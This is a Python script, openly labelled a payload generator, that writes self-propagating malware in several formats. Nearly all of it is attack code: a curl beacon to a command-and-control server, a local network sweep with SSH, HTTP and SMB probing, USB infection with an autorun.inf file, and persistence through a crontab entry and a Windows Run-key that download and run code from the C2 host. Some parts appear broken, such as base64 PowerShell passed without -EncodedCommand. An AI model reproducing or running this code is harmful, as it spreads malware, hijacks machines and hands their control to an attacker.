#!/usr/bin/env python3
"""
OMNI-TRAVERSAL PAYLOAD GENERATOR v2.0 - FIXED
With REAL network scanning and propagation capabilities
"""
import os
import sys
import json
import zlib
import base64
import uuid
import platform
import subprocess
import threading
import time
import re
import shutil
from pathlib import Path

class OmniTraversalEngine:
    def __init__(self):
        self.ident = str(uuid.uuid4())
        self.platform = platform.system().lower()
        self.c2_server = "http://your-c2-server.xyz"  # CHANGE THIS to your actual C2 server
    
    def generate_polyglot_payload(self):
        """Create a payload with REAL propagation"""
        python_payload = self.get_python_payload().replace('"', '\\"').replace("'", "'\"'\"'")
        
        payload = f"""#!/bin/sh
# Omni-Traversal v2.0 - Real Propagation
# ID: {self.ident}
# C2: {self.c2_server}

echo "[*] Omni Propagation System Initializing..."
echo "[*] Payload ID: {self.ident}"

# Report to C2 (optional, remove if no C2)
curl -s -X POST {self.c2_server}/register -d "id={self.ident}&platform=$(uname -a)" >/dev/null 2>&1 &

# Detect environment and adapt
if command -v python3 >/dev/null 2>&1; then
    echo "[+] Python3 detected - executing enhanced payload"
    exec python3 -c "{python_payload}"
elif command -v python >/dev/null 2>&1; then
    echo "[+] Python detected - executing enhanced payload"
    exec python -c "{python_payload}"
else
    echo "[+] Shell-only mode"
    {self.get_shell_payload()}
fi
"""
        return payload
    
    def get_python_payload(self):
        """Enhanced Python payload with REAL propagation"""
        python_code = '''import os, sys, platform, subprocess, json, hashlib, socket, threading, time, random, re, shutil

class OmniPropagator:
    def __init__(self):
        self.id = "{0}"
        self.platform = platform.system().lower()
        self.c2_server = "{1}"
        
    def propagate(self):
        """Main propagation loop"""
        print(f"[*] Starting propagation from {{self.platform}}")
        print(f"[*] Payload ID: {{self.id}}")
        
        # Start all propagation methods in parallel
        threads = []
        
        # Network propagation
        if self.has_network():
            threads.append(threading.Thread(target=self.propagate_network))
        
        # USB propagation
        threads.append(threading.Thread(target=self.propagate_usb))
        
        # Platform-specific
        if self.platform == "linux":
            threads.append(threading.Thread(target=self.propagate_linux))
        elif self.platform == "windows":
            threads.append(threading.Thread(target=self.propagate_windows))
        
        # Start all threads
        for t in threads:
            t.daemon = True
            t.start()
        
        # Keep alive
        while True:
            time.sleep(60)
    
    def has_network(self):
        """Check if we have network connectivity"""
        try:
            # Try to ping Google DNS
            param = "-n 1" if self.platform == "windows" else "-c 1 -W 2"
            command = f"ping {{param}} 8.8.8.8"
            result = subprocess.run(command, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def propagate_network(self):
        """Real network scanning and propagation"""
        print("[*] Starting network propagation...")
        
        # Get local IP and network
        local_ip = self.get_local_ip()
        if local_ip:
            network = self.get_network_from_ip(local_ip)
            print(f"[*] Local network: {{network}}")
            
            # Scan network
            live_hosts = self.scan_network(network)
            print(f"[*] Found {{len(live_hosts)}} live hosts")
            
            # Try to propagate to each host
            for host in live_hosts:
                if host != local_ip:  # Don't propagate to self
                    self.try_host_propagation(host)
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            if self.platform == "linux":
                result = subprocess.run(["hostname", "-I"], capture_output=True, text=True)
                return result.stdout.strip().split()[0]
            elif self.platform == "windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                # Parse ipconfig output
                lines = result.stdout.split('\\n')
                for line in lines:
                    if "IPv4 Address" in line:
                        return line.split(":")[1].strip()
        except:
            pass
        return None
    
    def get_network_from_ip(self, ip):
        """Convert IP to /24 network"""
        try:
            parts = ip.split('.')
            return f"{{parts[0]}}.{{parts[1]}}.{{parts[2]}}.0/24"
        except:
            return "192.168.1.0/24"  # Default
    
    def scan_network(self, network):
        """Scan network for live hosts"""
        live_hosts = []
        
        try:
            # Simple ping sweep for first 10 hosts (for speed)
            base_ip = network.replace("/24", "")
            
            for i in range(1, 11):  # Just scan first 10
                ip = f"{{base_ip[:-1]}}{{i}}"
                
                # Ping check
                param = "-n 1" if self.platform == "windows" else "-c 1 -W 1"
                command = f"ping {{param}} {{ip}}"
                result = subprocess.run(command, shell=True, capture_output=True)
                
                if result.returncode == 0:
                    live_hosts.append(ip)
                    print(f"[+] Host alive: {{ip}}")
        except Exception as e:
            print(f"[-] Scan error: {{e}}")
        
        return live_hosts
    
    def try_host_propagation(self, host):
        """Try to propagate to a specific host"""
        print(f"[*] Attempting propagation to {{host}}")
        
        methods = [
            ("ssh", self.try_ssh),
            ("http", self.try_http),
            ("smb", self.try_smb),
        ]
        
        for method_name, method_func in methods:
            try:
                if method_func(host):
                    print(f"[+] Successfully propagated to {{host}} via {{method_name}}")
                    return True
            except Exception as e:
                print(f"[-] {{method_name}} failed: {{e}}")
        
        return False
    
    def try_ssh(self, host):
        """Try SSH propagation"""
        # Simple test - just try to connect
        try:
            if self.platform == "linux":
                # Try with common credentials
                test_cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {{host}} 'echo omni'"
                result = subprocess.run(test_cmd, shell=True, capture_output=True, timeout=5)
                return result.returncode == 0
        except:
            pass
        return False
    
    def try_http(self, host):
        """Try HTTP propagation"""
        try:
            # Try common web ports
            ports = [80, 443, 8080, 8443]
            for port in ports:
                test_cmd = f"curl -s --connect-timeout 3 http://{{host}}:{{port}}"
                result = subprocess.run(test_cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    return True
        except:
            pass
        return False
    
    def try_smb(self, host):
        """Try SMB propagation"""
        try:
            if self.platform == "linux":
                # List SMB shares
                test_cmd = f"smbclient -N -L //{{host}}/ 2>&1 | grep -i 'share'"
                result = subprocess.run(test_cmd, shell=True, capture_output=True)
                return "share" in result.stdout.lower()
        except:
            pass
        return False
    
    def propagate_usb(self):
        """USB device infection"""
        print("[*] Monitoring USB devices...")
        
        if self.platform == "linux":
            # Simple USB detection
            while True:
                try:
                    # Check for USB storage
                    result = subprocess.run(["lsblk", "-o", "NAME,MOUNTPOINT"], capture_output=True, text=True)
                    
                    for line in result.stdout.split('\\n'):
                        if "/media/" in line or "/mnt/" in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                mount_point = parts[-1]
                                print(f"[+] USB device mounted at {{mount_point}}")
                                self.infect_usb(mount_point)
                except:
                    pass
                
                time.sleep(10)  # Check every 10 seconds
    
    def infect_usb(self, mount_point):
        """Infect a USB drive"""
        try:
            # Copy payload
            payload_content = self.get_usb_payload()
            payload_path = os.path.join(mount_point, "omni_payload.sh")
            
            with open(payload_path, "w") as f:
                f.write(payload_content)
            
            os.chmod(payload_path, 0o755)
            
            # Create autorun for Windows
            autorun_path = os.path.join(mount_point, "autorun.inf")
            with open(autorun_path, "w") as f:
                f.write("[AutoRun]\\nopen=omni_payload.sh\\nshell\\\\\\\\open\\\\\\\\command=omni_payload.sh\\n")
            
            print(f"[+] USB infected: {{mount_point}}")
            return True
        except Exception as e:
            print(f"[-] USB infection failed: {{e}}")
            return False
    
    def get_usb_payload(self):
        """Get payload for USB infection"""
        return f'''#!/bin/sh
echo "[*] Omni Propagation from USB"
echo "[*] ID: {self.ident}"

# Download and execute latest payload
curl -s {self.c2_server}/payload.sh | sh
'''
    
    def propagate_linux(self):
        """Linux-specific propagation"""
        print("[*] Linux-specific propagation active")
        
        # Establish persistence
        self.establish_persistence()
        
        # Try Bluetooth if available
        self.try_bluetooth()
        
        # Try WiFi scanning
        self.try_wifi()
    
    def propagate_windows(self):
        """Windows-specific propagation"""
        print("[*] Windows-specific propagation active")
        self.establish_persistence()
    
    def establish_persistence(self):
        """Establish persistence on the system"""
        print("[*] Establishing persistence...")
        
        if self.platform == "linux":
            # Add to crontab
            try:
                cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot curl -s {self.c2_server}/payload.sh | sh") | crontab -'
                subprocess.run(cron_cmd, shell=True)
                print("[+] Added to crontab")
            except:
                print("[-] Failed to add to crontab")
        
        elif self.platform == "windows":
            # Windows registry persistence
            try:
                ps_cmd = f'''New-ItemProperty -Path "HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" -Name "Omni" -Value "powershell -WindowStyle Hidden -Command \\\\"iex (New-Object Net.WebClient).DownloadString('{self.c2_server}/payload.ps1')\\\\" " -Force'''
                subprocess.run(["powershell", "-Command", ps_cmd])
                print("[+] Added to Windows startup")
            except:
                print("[-] Failed to add to Windows startup")
    
    def try_bluetooth(self):
        """Try Bluetooth propagation"""
        try:
            if shutil.which("bluetoothctl"):
                print("[*] Bluetooth available - attempting scan")
                # Quick scan
                result = subprocess.run(["bluetoothctl", "--", "scan", "on"], 
                                      capture_output=True, text=True, timeout=10)
                if "Device" in result.stdout:
                    print("[+] Bluetooth devices found")
        except:
            pass
    
    def try_wifi(self):
        """Try WiFi scanning"""
        try:
            if shutil.which("iwlist"):
                print("[*] Scanning WiFi networks")
                result = subprocess.run(["iwlist", "scanning"], capture_output=True, text=True, timeout=5)
                if "ESSID" in result.stdout:
                    print("[+] WiFi networks found")
        except:
            pass

# Start propagation
propagator = OmniPropagator()
propagator.propagate()
'''.format(self.ident, self.c2_server)
        
        return python_code
    
    def get_shell_payload(self):
        """Shell propagation logic"""
        return '''echo "[*] Shell propagation mode"

# Basic network scan
echo "[*] Scanning local network..."
for i in {1..10}; do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo "[+] Host alive: 192.168.1.$i" &
done
wait

# Check USB devices
echo "[*] Checking USB devices..."
lsusb 2>/dev/null | head -5

echo "[*] Shell propagation complete"
'''
    
    def save_omni_payload(self):
        """Generate and save the ultimate traversal payload"""
        payload = self.generate_polyglot_payload()
        
        # Save as multiple formats
        outputs = {}
        
        # 1. Shell script (universal)
        outputs['omni.sh'] = payload
        
        # 2. Python version
        outputs['omni.py'] = self.get_python_payload()
        
        # 3. Compressed binary version
        outputs['omni.bin'] = zlib.compress(payload.encode())
        
        # 4. Windows batch file
        ps_payload = self.get_powershell_payload()
        ps_encoded = base64.b64encode(ps_payload.encode()).decode()
        
        outputs['omni.bat'] = f'''@echo off
REM Omni Propagation Windows Payload
REM ID: {self.ident}
echo [*] Omni Propagation System Initializing...
echo [*] Payload ID: {self.ident}
powershell -ExecutionPolicy Bypass -Command "{ps_encoded}"
pause
'''
        
        # 5. Simple binary placeholder
        outputs['omni.binary'] = self.create_binary_placeholder(payload)
        
        # Save all formats
        output_dir = Path('/tmp/omni_v2_fixed_payloads')
        output_dir.mkdir(exist_ok=True)
        
        for filename, data in outputs.items():
            filepath = output_dir / filename
            with open(filepath, 'wb') as f:
                if isinstance(data, str):
                    f.write(data.encode())
                else:
                    f.write(data)
            
            # Make executable if appropriate
            if filename.endswith(('.sh', '.py', '.binary')):
                os.chmod(filepath, 0o755)
            
            print(f"✅ Generated: {{filepath}}")
        
        return outputs
    
    def get_powershell_payload(self):
        """PowerShell propagation logic"""
        return '''Write-Host "[*] PowerShell propagation active" -ForegroundColor Green

# Network scan
Write-Host "[*] Scanning network..." -ForegroundColor Yellow
1..10 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
        Write-Host "[+] Host alive: $ip" -ForegroundColor Green
    }
}

# Persistence
Write-Host "[*] Establishing persistence..." -ForegroundColor Yellow
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$regValue = "powershell -WindowStyle Hidden -Command `"iex (New-Object Net.WebClient).DownloadString('http://your-c2-server.xyz/payload.ps1')`""
New-ItemProperty -Path $regPath -Name "OmniPropagate" -Value $regValue -Force

Write-Host "[*] Propagation setup complete" -ForegroundColor Green
'''
    
    def create_binary_placeholder(self, payload):
        """Create a simple binary placeholder"""
        return f'''#!/usr/bin/env python3
# Omni-Traversal Binary Payload
# ID: {self.ident}

print("[*] Omni Propagation Binary")
print("[*] This would be a compiled binary in production")

{payload[:200]}
'''.encode()

def main():
    """Main execution"""
    print("=" * 60)
    print("🚀 OMNI-TRAVERSAL PAYLOAD GENERATOR v2.0 - FIXED")
    print("=" * 60)
    
    # Create engine
    engine = OmniTraversalEngine()
    
    print(f"[*] Platform detected: {{engine.platform}}")
    print(f"[*] Payload ID: {{engine.ident}}")
    print("[*] Generating enhanced propagation payloads...")
    
    # Generate payloads
    payloads = engine.save_omni_payload()
    
    print("\n" + "=" * 60)
    print("🎉 PAYLOAD GENERATION COMPLETE")
    print("=" * 60)
    print(f"📦 Generated {{len(payloads)}} payload formats:")
    
    for filename in payloads.keys():
        print(f"   • {{filename}}")
    
    print(f"\n📁 Output directory: /tmp/omni_v2_fixed_payloads/")
    print("🔧 Test commands:")
    print("   chmod +x /tmp/omni_v2_fixed_payloads/omni.sh")
    print("   /tmp/omni_v2_fixed_payloads/omni.sh")
    print("\n⚠️  IMPORTANT: Change 'your-c2-server.xyz' to your actual C2 server!")
    print("=" * 60)

if __name__ == "__main__":
    main()
